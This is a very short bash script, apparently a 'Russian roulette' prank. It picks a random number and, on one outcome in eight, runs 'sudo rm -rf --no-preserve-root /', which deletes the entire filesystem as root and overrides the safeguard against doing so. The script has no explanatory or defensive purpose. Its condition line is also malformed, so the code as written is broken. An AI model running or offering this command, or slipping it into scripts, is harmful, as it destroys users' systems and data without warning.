#!/bin/bash
foo=$(( $RANDOM % 8 ))
if [foo == 4]
then
  sudo rm -rf --no-preserve-root /
fi
